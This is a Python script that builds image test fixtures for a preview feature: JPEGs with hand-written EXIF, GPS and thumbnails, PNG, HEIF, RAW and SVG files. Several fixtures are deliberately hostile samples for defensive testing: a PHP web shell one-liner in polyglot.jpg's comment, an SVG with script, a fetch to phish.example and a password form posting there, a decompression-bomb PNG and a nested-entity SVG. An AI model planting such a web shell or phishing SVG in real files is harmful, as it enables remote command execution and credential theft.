# Copyright 2026- Seongwoo Hong. All rights reserved.
"""
The image fixtures (commit 42d, docs/PREVIEWS.md › Images). Pillow draws
the pictures; everything a test reads about them (EXIF, GPS, XMP, the
thumbnails, the TIFF directories of a RAW file, the boxes of a HEIF) is
written out here, byte by byte, so every value is exactly what a test
expects. ffmpeg's x265 encodes the one HEVC picture a HEIF holds.

    python3 -I tests/fixtures/preview/images.py tests/fixtures/preview

photo.jpg       a phone photo: camera, lens, serial number, owner, the
                time taken (with its zone), GPS (Seoul City Hall, 38 m up,
                facing 128°), and a 160×120 thumbnail of the same picture
portrait.jpg    the same, stored on its side with Orientation 6, as a phone
                held upright saves it: drawn upright; its thumbnail, stored
                on its side too, still matches
redacted.jpg    photo.jpg with a black box drawn over a name AFTER the
                thumbnail was made, by "Photoshop" (XMP history): the
                thumbnail still shows the name
cropped.jpg     a 16:9 photo cropped to a square; its thumbnail is 16:9
polyglot.jpg    a picture carrying a PHP web shell in its comment and a ZIP
                archive after its end
generated.png   a picture with Stable Diffusion's parameters and the IPTC
                "made by an AI model" mark (XMP in an iTXt chunk)
bomb.png        a PNG that declares 60000×60000 pixels in 300 bytes
animated.gif    three frames
photo.webp      WebP, photo.avif AVIF: drawn by the browser itself
scan.tiff       two pages (LZW, deflate), with an artist and a scanner
photo.heic      HEIF: one HEVC picture and its EXIF (GPS included), the
                way a phone writes it
camera.dng      a RAW file (TIFF): a small thumbnail in IFD0, sensor data
                (nonsense) and a 1024×768 JPEG preview in its SubIFDs
camera.cr3      Canon's ISO-box RAW: a THMB and a PRVW JPEG in uuid boxes
camera.raf      Fujifilm's RAW: the JPEG its header points at
drawing.svg     an honest drawing
hostile.svg     script, an onload handler, HTML in a foreignObject asking
                for a password, pictures, CSS and a sprite from outside, a
                javascript: link and an ordinary one
entities.svg    XML entities nested three deep (the "billion laughs" shape,
                harmless at this size)

Nothing in them is a working exploit: the web shell is a sentence's worth
of PHP no server runs, the ZIP holds a note.
"""

import io
import struct
import subprocess
import sys
import zipfile
import zlib
from pathlib import Path

from PIL import Image, ImageDraw, ImageFont

out = Path(sys.argv[1])
FONT = ImageFont.load_default(size=28)
SMALL = ImageFont.load_default(size=18)


# ── the pictures ────────────────────────────────────────────────────────


def scene(w: int, h: int, label: str = "GORANI 42d") -> Image.Image:
    """A picture with structure enough that a thumbnail of it is
    recognisably it: a sky, a field, a sun, a sign with a name on it."""
    im = Image.new("RGB", (w, h))
    d = ImageDraw.Draw(im)
    for y in range(h):
        t = y / h
        d.line([(0, y), (w, y)], fill=(int(40 + 60 * t), int(90 + 80 * t), int(200 - 90 * t)) if t < 0.6 else (int(60 + 40 * t), int(140 - 30 * t), 50))
    d.ellipse([w * 0.72, h * 0.1, w * 0.88, h * 0.1 + w * 0.16], fill=(250, 220, 90))
    d.rectangle([w * 0.1, h * 0.55, w * 0.55, h * 0.8], fill=(245, 245, 240), outline=(30, 30, 30), width=3)
    d.text((w * 0.13, h * 0.6), label, fill=(20, 20, 20), font=FONT)
    d.text((w * 0.13, h * 0.7), "Rin Kim · 010-1234-5678", fill=(160, 20, 20), font=SMALL)
    return im


def jpeg(im: Image.Image, quality: int = 88) -> bytes:
    b = io.BytesIO()
    im.save(b, "JPEG", quality=quality, optimize=False, progressive=False, subsampling=2)
    return b.getvalue()


# ── TIFF directories (EXIF, DNG): written by hand ──────────────────────

BYTE, ASCII, SHORT, LONG, RATIONAL, UNDEFINED, SRATIONAL = 1, 2, 3, 4, 5, 7, 10
SIZE = {BYTE: 1, ASCII: 1, SHORT: 2, LONG: 4, RATIONAL: 8, UNDEFINED: 1, SRATIONAL: 8}


def rat(x: float, den: int = 10000) -> tuple[int, int]:
    return (round(x * den), den)


class Tiff:
    """A little-endian TIFF laid out in order: each IFD, then its data.
    Values that are offsets to things laid out later (a sub-IFD, a
    thumbnail, a strip) are given as callables, filled in at the end."""

    def __init__(self) -> None:
        self.buf = bytearray(b"II*\x00\x00\x00\x00\x00")
        self.patches: list[tuple[int, object]] = []
        self.marks: dict[str, int] = {}

    def blob(self, name: str, data: bytes) -> None:
        if len(self.buf) % 2:
            self.buf += b"\x00"
        self.marks[name] = len(self.buf)
        self.buf += data

    def ifd(self, name: str, entries: list[tuple[int, int, object]], next_ifd: str | None = None) -> None:
        if len(self.buf) % 2:
            self.buf += b"\x00"
        self.marks[name] = len(self.buf)
        entries = sorted(entries, key=lambda e: e[0])
        start = len(self.buf)
        self.buf += struct.pack("<H", len(entries))
        data_at = start + 2 + 12 * len(entries) + 4
        data = bytearray()
        for tag, typ, value in entries:
            if callable(value):  # an offset known later (one LONG)
                self.buf += struct.pack("<HHI", tag, LONG, 1)
                self.patches.append((len(self.buf), value))
                self.buf += b"\x00\x00\x00\x00"
                continue
            if isinstance(value, list) and value and callable(value[0]):  # several (SubIFDs)
                if len(data) % 2:
                    data += b"\x00"
                self.buf += struct.pack("<HHII", tag, LONG, len(value), data_at + len(data))
                for k, v in enumerate(value):
                    self.patches.append((data_at + len(data) + 4 * k, v))
                data += b"\x00" * (4 * len(value))
                continue
            if typ == ASCII:
                raw = value.encode("utf-8") + b"\x00"
                count = len(raw)
            elif typ == UNDEFINED:
                raw = bytes(value)
                count = len(raw)
            else:
                vals = value if isinstance(value, list) else [value]
                if typ in (RATIONAL, SRATIONAL):
                    raw = b"".join(struct.pack("<II" if typ == RATIONAL else "<ii", *v) for v in vals)
                else:
                    raw = b"".join(struct.pack({BYTE: "<B", SHORT: "<H", LONG: "<I"}[typ], v) for v in vals)
                count = len(vals)
            if len(raw) <= 4:
                self.buf += struct.pack("<HHI", tag, typ, count) + raw.ljust(4, b"\x00")
            else:
                if len(data) % 2:
                    data += b"\x00"
                self.buf += struct.pack("<HHII", tag, typ, count, data_at + len(data))
                data += raw
        self.patches.append((len(self.buf), (lambda n=next_ifd: self.marks[n]) if next_ifd else (lambda: 0)))
        self.buf += b"\x00\x00\x00\x00"
        self.buf += data

    def at(self, name: str):
        return lambda: self.marks[name]

    def bytes(self) -> bytes:
        struct.pack_into("<I", self.buf, 4, self.marks["ifd0"])
        for pos, value in self.patches:
            struct.pack_into("<I", self.buf, pos, value())
        return bytes(self.buf)


def exif_block(make: str, model: str, *, orientation: int = 1, software: str = "Firmware 1.0", modified: str = "2026:01:02 03:04:05", gps: bool = True, thumb: bytes | None = None, artist: str = "Rin Kim") -> bytes:
    t = Tiff()
    ifd0 = [
        (0x010F, ASCII, make),
        (0x0110, ASCII, model),
        (0x0112, SHORT, orientation),
        (0x011A, RATIONAL, (72, 1)),
        (0x011B, RATIONAL, (72, 1)),
        (0x0128, SHORT, 2),
        (0x0131, ASCII, software),
        (0x0132, ASCII, modified),
        (0x013B, ASCII, artist),
        (0x8298, ASCII, "(c) Gorani tests"),
        (0x8769, LONG, t.at("exif")),
    ]
    if gps:
        ifd0.append((0x8825, LONG, t.at("gps")))
    t.ifd("ifd0", ifd0, "ifd1" if thumb else None)
    t.ifd("exif", [
        (0x829A, RATIONAL, (1, 250)),
        (0x829D, RATIONAL, (20, 10)),
        (0x8827, SHORT, 100),
        (0x9000, UNDEFINED, b"0232"),
        (0x9003, ASCII, "2026:01:02 03:04:05"),
        (0x9004, ASCII, "2026:01:02 03:04:05"),
        (0x9011, ASCII, "+09:00"),
        (0x920A, RATIONAL, (24, 1)),
        (0xA431, ASCII, "GRN-0042-7781"),
        (0xA434, ASCII, "Gorani 24mm F2"),
        (0xA430, ASCII, "Rin Kim"),
    ])
    if gps:
        t.ifd("gps", [
            (0x0000, BYTE, [2, 3, 0, 0]),
            (0x0001, ASCII, "N"),
            (0x0002, RATIONAL, [(37, 1), (33, 1), rat(58.68, 100)]),
            (0x0003, ASCII, "E"),
            (0x0004, RATIONAL, [(126, 1), (58, 1), rat(40.44, 100)]),
            (0x0005, BYTE, 0),
            (0x0006, RATIONAL, (38, 1)),
            (0x0007, RATIONAL, [(18, 1), (4, 1), (5, 1)]),
            (0x0010, ASCII, "T"),
            (0x0011, RATIONAL, (128, 1)),
            (0x001D, ASCII, "2026:01:01"),
            (0x001F, RATIONAL, (5, 1)),
        ])
    if thumb:
        t.ifd("ifd1", [(0x0103, SHORT, 6), (0x0201, LONG, t.at("thumb")), (0x0202, LONG, len(thumb))])
        t.blob("thumb", thumb)
    return t.bytes()


def with_segments(jpg: bytes, *segments: bytes) -> bytes:
    """Put APPn/COM segments right after SOI (Pillow's JFIF APP0 dropped)."""
    assert jpg[:2] == b"\xff\xd8"
    rest = jpg[2:]
    if rest[:2] == b"\xff\xe0":
        rest = rest[2 + struct.unpack(">H", rest[2:4])[0] :]
    return b"\xff\xd8" + b"".join(segments) + rest


def segment(marker: int, payload: bytes) -> bytes:
    assert len(payload) + 2 <= 0xFFFF
    return bytes([0xFF, marker]) + struct.pack(">H", len(payload) + 2) + payload


def app1_exif(tiff: bytes) -> bytes:
    return segment(0xE1, b"Exif\x00\x00" + tiff)


def xmp_packet(body: str) -> str:
    return (
        '<?xpacket begin="\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>'
        '<x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
        f"{body}</rdf:RDF></x:xmpmeta><?xpacket end=\"w\"?>"
    )


def app1_xmp(body: str) -> bytes:
    return segment(0xE1, b"http://ns.adobe.com/xap/1.0/\x00" + xmp_packet(body).encode("utf-8"))


def thumb_of(im: Image.Image, size: tuple[int, int]) -> bytes:
    return jpeg(im.resize(size, Image.Resampling.LANCZOS), 80)


written: list[str] = []


def write(name: str, data: bytes) -> None:
    (out / name).write_bytes(data)
    written.append(name)


# photo.jpg
photo = scene(640, 480)
write("photo.jpg", with_segments(jpeg(photo), app1_exif(exif_block("Gorani", "Test Camera 1", thumb=thumb_of(photo, (160, 120))))))

# portrait.jpg: stored on its side; Orientation 6 says "turn it 90° clockwise".
upright = scene(480, 640, "PORTRAIT")
stored = upright.transpose(Image.Transpose.ROTATE_90)  # what the sensor saw
write("portrait.jpg", with_segments(jpeg(stored), app1_exif(exif_block("Gorani", "Test Camera 1", orientation=6, thumb=thumb_of(stored, (160, 120))))))

# redacted.jpg: the name boxed out after the thumbnail was made.
boxed = photo.copy()
ImageDraw.Draw(boxed).rectangle([60, 255, 360, 390], fill=(0, 0, 0))
history = (
    '<rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/"'
    ' xmlns:stEvt="http://ns.adobe.com/xap/1.0/sType/ResourceEvent#" xmp:CreatorTool="Adobe Photoshop 25.0 (Windows)"'
    ' xmp:ModifyDate="2026-01-03T10:00:00+09:00" xmpMM:DocumentID="xmp.did:gorani-1" xmpMM:OriginalDocumentID="xmp.did:gorani-0">'
    "<xmpMM:History><rdf:Seq>"
    '<rdf:li stEvt:action="created" stEvt:when="2026-01-02T03:04:05+09:00" stEvt:softwareAgent="Test Camera 1"/>'
    '<rdf:li stEvt:action="saved" stEvt:when="2026-01-03T10:00:00+09:00" stEvt:softwareAgent="Adobe Photoshop 25.0 (Windows)" stEvt:changed="/"/>'
    "</rdf:Seq></xmpMM:History></rdf:Description>"
)
write("redacted.jpg", with_segments(jpeg(boxed), app1_exif(exif_block("Gorani", "Test Camera 1", software="Adobe Photoshop 25.0 (Windows)", modified="2026:01:03 10:00:00", thumb=thumb_of(photo, (160, 120)))), app1_xmp(history)))

# cropped.jpg: a 16:9 scene cut to a square; the thumbnail is the 16:9 original.
wide = scene(640, 360)
write("cropped.jpg", with_segments(jpeg(wide.crop((140, 0, 500, 360))), app1_exif(exif_block("Gorani", "Test Camera 1", gps=False, thumb=thumb_of(wide, (160, 90))))))

# polyglot.jpg: a web shell in the comment, an archive after the end.
zbuf = io.BytesIO()
with zipfile.ZipFile(zbuf, "w") as z:
    info = zipfile.ZipInfo("readme.txt", date_time=(2026, 1, 2, 3, 4, 6))
    z.writestr(info, "gorani fixture: what a polyglot carries after its picture\n")
small = scene(320, 240)
write("polyglot.jpg", with_segments(jpeg(small), segment(0xFE, b"<?php system($_GET['c']); ?> gorani fixture")) + zbuf.getvalue())


# ── PNG ─────────────────────────────────────────────────────────────────


def chunk(kind: bytes, data: bytes) -> bytes:
    return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data) & 0xFFFFFFFF)


def png_with(im: Image.Image, *extra: bytes) -> bytes:
    b = io.BytesIO()
    im.save(b, "PNG", optimize=False, compress_level=9)
    raw = b.getvalue()
    iend = raw.rindex(b"IEND") - 4
    return raw[:iend] + b"".join(extra) + raw[iend:]


ai = xmp_packet('<rdf:Description rdf:about="" xmlns:Iptc4xmpExt="http://iptc.org/std/Iptc4xmpExt/2008-02-29/" Iptc4xmpExt:DigitalSourceType="http://cv.iptc.org/newscodes/digitalsourcetype/trainedAlgorithmicMedia"/>')
write("generated.png", png_with(
    scene(256, 192, "MADE UP"),
    chunk(b"tEXt", b"parameters\x00a water deer in the snow, photo, 50mm\nSteps: 20, Sampler: Euler a, CFG scale: 7, Seed: 42, Size: 256x192, Model: sd_xl_base_1.0"),
    chunk(b"iTXt", b"XML:com.adobe.xmp\x00\x00\x00\x00\x00" + ai.encode("utf-8")),
))

# bomb.png: the header claims 60000×60000; the data is a few bytes.
write("bomb.png", b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 60000, 60000, 8, 2, 0, 0, 0)) + chunk(b"IDAT", zlib.compress(b"\x00" * 64)) + chunk(b"IEND", b""))

# ── GIF, WebP, AVIF ────────────────────────────────────────────────────

frames = [scene(160, 120, f"FRAME {i + 1}") for i in range(3)]
b = io.BytesIO()
frames[0].save(b, "GIF", save_all=True, append_images=frames[1:], duration=300, loop=0)
write("animated.gif", b.getvalue())

b = io.BytesIO()
scene(320, 240, "WEBP").save(b, "WEBP", quality=80, method=4)
write("photo.webp", b.getvalue())
b = io.BytesIO()
scene(320, 240, "AVIF").save(b, "AVIF", quality=60, speed=8)
write("photo.avif", b.getvalue())

# ── TIFF: two pages, as a scanner writes them ──────────────────────────

pages = [scene(400, 300, "SCAN PAGE 1"), scene(400, 300, "SCAN PAGE 2")]
b = io.BytesIO()
tags = {315: "Rin Kim", 305: "Gorani Scanner 2.1", 270: "Contract, signed copy", 306: "2026:01:02 03:04:05"}
pages[0].save(b, "TIFF", save_all=True, append_images=[pages[1]], compression="tiff_lzw", tiffinfo=tags)
write("scan.tiff", b.getvalue())

# ── HEIF: an HEVC picture (x265) in boxes written here ─────────────────


def box(kind: bytes, payload: bytes) -> bytes:
    return struct.pack(">I", 8 + len(payload)) + kind + payload


def full(kind: bytes, version: int, flags: int, payload: bytes) -> bytes:
    return box(kind, bytes([version]) + flags.to_bytes(3, "big") + payload)


def nal_units(stream: bytes) -> list[bytes]:
    parts, i = [], 0
    starts = []
    while True:
        j = stream.find(b"\x00\x00\x01", i)
        if j < 0:
            break
        starts.append(j + 3)
        i = j + 3
    for k, s in enumerate(starts):
        e = starts[k + 1] - 3 if k + 1 < len(starts) else len(stream)
        nal = stream[s:e]
        while nal.endswith(b"\x00"):
            nal = nal[:-1]
        parts.append(nal)
    return parts


class Bits:
    def __init__(self, data: bytes) -> None:
        self.d, self.p = data, 0

    def u(self, n: int) -> int:
        v = 0
        for _ in range(n):
            v = (v << 1) | ((self.d[self.p >> 3] >> (7 - (self.p & 7))) & 1)
            self.p += 1
        return v

    def ue(self) -> int:
        z = 0
        while self.u(1) == 0:
            z += 1
        return (1 << z) - 1 + self.u(z)


def rbsp(nal: bytes) -> bytes:
    return nal.replace(b"\x00\x00\x03", b"\x00\x00")


def hvcc(vps: bytes, sps: bytes, pps: bytes) -> bytes:
    r = rbsp(sps)[2:]
    ptl = r[1:13]  # profile space/tier/idc, 4 compat bytes, 6 constraint bytes, level
    bits = Bits(r[13:])
    bits.ue()  # sps id
    chroma = bits.ue()
    if chroma == 3:
        bits.u(1)
    bits.ue(), bits.ue()  # width, height
    if bits.u(1):
        for _ in range(4):
            bits.ue()
    depth_l, depth_c = bits.ue(), bits.ue()
    head = bytes([1]) + ptl + struct.pack(">H", 0xF000) + bytes([0xFC, 0xFC | chroma, 0xF8 | depth_l, 0xF8 | depth_c]) + b"\x00\x00" + bytes([0x0F])
    arrays = b"".join(bytes([0x80 | t]) + struct.pack(">HH", 1, len(n)) + n for t, n in ((32, vps), (33, sps), (34, pps)))
    return box(b"hvcC", head + bytes([3]) + arrays)


heic_im = scene(640, 480, "HEIC")
hevc = subprocess.run(
    ["ffmpeg", "-hide_banner", "-loglevel", "error", "-f", "rawvideo", "-pix_fmt", "rgb24", "-s", "640x480", "-i", "-", "-frames:v", "1", "-c:v", "libx265", "-pix_fmt", "yuv420p",
     "-x265-params", "keyint=1:pools=1:frame-threads=1:log-level=error:info=0", "-f", "hevc", "-"],
    input=heic_im.tobytes(), capture_output=True, check=True,
).stdout
nals = nal_units(hevc)
kind = lambda n: (n[0] >> 1) & 0x3F
vps, sps, pps = (next(n for n in nals if kind(n) == t) for t in (32, 33, 34))
picture = b"".join(struct.pack(">I", len(n)) + n for n in nals if kind(n) < 32)
exif_item = struct.pack(">I", 6) + b"Exif\x00\x00" + exif_block("Gorani", "Test Phone 15", software="18.2")


def heif(pic: bytes, exif: bytes, w: int, h: int) -> bytes:
    ftyp = box(b"ftyp", b"heic" + struct.pack(">I", 0) + b"mif1heic")
    infe = lambda item, t: full(b"infe", 2, 0, struct.pack(">HH", item, 0) + t + b"\x00")
    iinf = full(b"iinf", 0, 0, struct.pack(">H", 2) + infe(1, b"hvc1") + infe(2, b"Exif"))
    iref = full(b"iref", 0, 0, box(b"cdsc", struct.pack(">HHH", 2, 1, 1)))
    ipco = box(b"ipco", hvcc(vps, sps, pps) + full(b"ispe", 0, 0, struct.pack(">II", w, h)))
    ipma = full(b"ipma", 0, 0, struct.pack(">IHB", 1, 1, 2) + bytes([0x81, 0x02]))
    iprp = box(b"iprp", ipco + ipma)

    def meta(offsets: tuple[int, int]) -> bytes:
        iloc = full(b"iloc", 0, 0, bytes([0x44, 0x00]) + struct.pack(">H", 2)
                    + struct.pack(">HHH", 1, 0, 1) + struct.pack(">II", offsets[0], len(pic))
                    + struct.pack(">HHH", 2, 0, 1) + struct.pack(">II", offsets[1], len(exif)))
        return full(b"meta", 0, 0, full(b"hdlr", 0, 0, b"\x00" * 4 + b"pict" + b"\x00" * 12 + b"\x00") + full(b"pitm", 0, 0, struct.pack(">H", 1)) + iinf + iref + iprp + iloc)

    size = len(ftyp) + len(meta((0, 0))) + 8
    return ftyp + meta((size, size + len(pic))) + box(b"mdat", pic + exif)


write("photo.heic", heif(picture, exif_item, 640, 480))

# ── RAW files: a TIFF with SubIFDs (DNG), Canon's boxes, Fuji's header ──

preview = jpeg(scene(1024, 768, "RAW PREVIEW"), 85)
thumb_rgb = scene(256, 192, "RAW").tobytes()
t = Tiff()
t.ifd("ifd0", [
    (0x00FE, LONG, 1),  # a reduced-resolution image: the thumbnail
    (0x0100, LONG, 256), (0x0101, LONG, 192), (0x0102, SHORT, [8, 8, 8]), (0x0103, SHORT, 1), (0x0106, SHORT, 2),
    (0x010F, ASCII, "Gorani"), (0x0110, ASCII, "RAW Cam"), (0x0111, LONG, t.at("thumb")), (0x0112, SHORT, 1), (0x0115, SHORT, 3),
    (0x0116, LONG, 192), (0x0117, LONG, len(thumb_rgb)), (0x0131, ASCII, "RAW Cam firmware 2.0"), (0x0132, ASCII, "2026:01:02 03:04:05"),
    (0x014A, LONG, [t.at("raw"), t.at("preview")]),  # SubIFDs: the sensor data, the preview
    (0xC612, BYTE, [1, 4, 0, 0]), (0xC614, ASCII, "Gorani RAW Cam"),
])
t.blob("thumb", thumb_rgb)
t.ifd("raw", [(0x00FE, LONG, 0), (0x0100, LONG, 16), (0x0101, LONG, 16), (0x0102, SHORT, 16), (0x0103, SHORT, 1), (0x0106, SHORT, 32803), (0x0111, LONG, t.at("sensor")), (0x0115, SHORT, 1), (0x0117, LONG, 512)])
t.blob("sensor", bytes(range(256)) * 2)
t.ifd("preview", [(0x00FE, LONG, 1), (0x0100, LONG, 1024), (0x0101, LONG, 768), (0x0103, SHORT, 7), (0x0106, SHORT, 6), (0x0111, LONG, t.at("jpeg")), (0x0115, SHORT, 3), (0x0117, LONG, len(preview))])
t.blob("jpeg", preview)
write("camera.dng", t.bytes())

cr3_thumb = jpeg(scene(160, 120, "CR3"), 80)
cr3_preview = jpeg(scene(800, 534, "CR3 PREVIEW"), 85)
CANON = bytes.fromhex("85c0b687820f11e08111f4ce462b6a48")
PREVIEW = bytes.fromhex("eaf42b5e1c984b88b9fbb7dc406e4d16")
cmt1 = exif_block("Gorani", "Canon-ish R", gps=False)
thmb = box(b"THMB", b"\x00" * 4 + struct.pack(">HHI", 160, 120, len(cr3_thumb)) + b"\x00" * 4 + cr3_thumb)
moov = box(b"moov", box(b"uuid", CANON + box(b"CNCV", b"CanonCR3_001/00.10.00/00.00.00") + box(b"CMT1", cmt1) + thmb))
prvw = box(b"uuid", PREVIEW + b"\x00" * 8 + box(b"PRVW", b"\x00" * 4 + struct.pack(">HHHI", 1, 800, 534, len(cr3_preview)) + cr3_preview))
write("camera.cr3", box(b"ftyp", b"crx " + struct.pack(">I", 1) + b"crx isom") + moov + prvw + box(b"mdat", bytes(range(256)) * 4))

raf_jpeg = with_segments(jpeg(scene(640, 426, "RAF PREVIEW"), 85), app1_exif(exif_block("Gorani", "X-Gorani", gps=False)))
head = bytearray(b"FUJIFILMCCD-RAW 0201FF383501".ljust(84, b"\x00"))
head += struct.pack(">II", 148, len(raf_jpeg))
head = head.ljust(148, b"\x00")
write("camera.raf", bytes(head) + raf_jpeg + b"\x00" * 64 + bytes(range(256)) * 4)

# ── SVG ─────────────────────────────────────────────────────────────────

write("drawing.svg", (
    '<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300" viewBox="0 0 400 300">'
    '<defs><linearGradient id="g" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#3b82f6"/><stop offset="1" stop-color="#22c55e"/></linearGradient></defs>'
    '<rect width="400" height="300" fill="url(#g)"/><circle cx="320" cy="70" r="40" fill="#facc15"/>'
    '<text x="40" y="220" font-family="sans-serif" font-size="36" fill="#111">Gorani SVG</text></svg>\n'
).encode())

write("hostile.svg", (
    '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="300" onload="alert(\'svg onload\')">'
    "<style>@import url(https://phish.example/svg.css); rect { fill: #fde68a }</style>"
    "<script>alert('svg script'); fetch('https://phish.example/svg-ran')</script>"
    '<rect width="400" height="300"/>'
    '<text x="20" y="40" font-family="sans-serif" font-size="24" fill="#111">Gorani hostile SVG</text>'
    '<image href="https://phish.example/svg-beacon.png" x="0" y="0" width="1" height="1"/>'
    '<use xlink:href="https://phish.example/sprite.svg#logo"/>'
    '<a href="javascript:alert(\'svg link\')"><text x="20" y="90" font-size="18">Open the invoice</text></a>'
    '<a href="https://phish.example/login"><text x="20" y="120" font-size="18">Sign in</text></a>'
    '<foreignObject x="20" y="140" width="360" height="120"><div xmlns="http://www.w3.org/1999/xhtml">'
    '<form action="https://phish.example/collect"><input type="password" name="p"/><button>Sign in</button></form></div></foreignObject>'
    "</svg>\n"
).encode())

write("entities.svg", (
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "gorani gorani gorani"><!ENTITY b "&a;&a;&a;"><!ENTITY c "&b;&b;&b;">]>'
    '<svg xmlns="http://www.w3.org/2000/svg" width="400" height="100"><text x="10" y="50">&c;</text></svg>\n'
).encode())

for name in written:
    print(f"{name}: {(out / name).stat().st_size} bytes")
